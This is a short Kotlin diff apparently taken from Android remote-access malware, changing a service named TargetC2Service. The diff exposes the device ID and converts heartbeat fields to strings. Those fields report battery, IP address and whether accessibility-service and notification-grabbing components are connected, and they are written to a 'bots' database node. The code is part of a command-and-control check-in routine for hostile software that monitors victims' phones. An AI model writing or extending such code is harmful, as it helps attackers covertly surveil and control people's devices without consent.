@@ -31,7 +31,8 @@ class TargetC2Service : Service() {
         @Volatile
         var isRunning = false
             private set
-        private var deviceId: String = ""
+        var deviceId: String = ""
+            private set
         private var job: Job? = null
         private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     }
@@ -151,11 +152,11 @@ class TargetC2Service : Service() {
         val updates = mapOf<String, Any>(
             "isOnline" to true,
             "lastSeen" to System.currentTimeMillis(),
-            "batteryLevel" to getBatteryLevel(),
-            "isCharging" to isCharging(),
+            "batteryLevel" to getBatteryLevel().toString(),
+            "isCharging" to isCharging().toString(),
             "ipAddress" to getIPAddress(),
-            "isAccessibilityEnabled" to TargetAccessibility.isConnected,
-            "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected
+            "isAccessibilityEnabled" to TargetAccessibility.isConnected.toString(),
+            "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected.toString()
         )
         botsRef.child(deviceId).updateChildren(updates)
     }
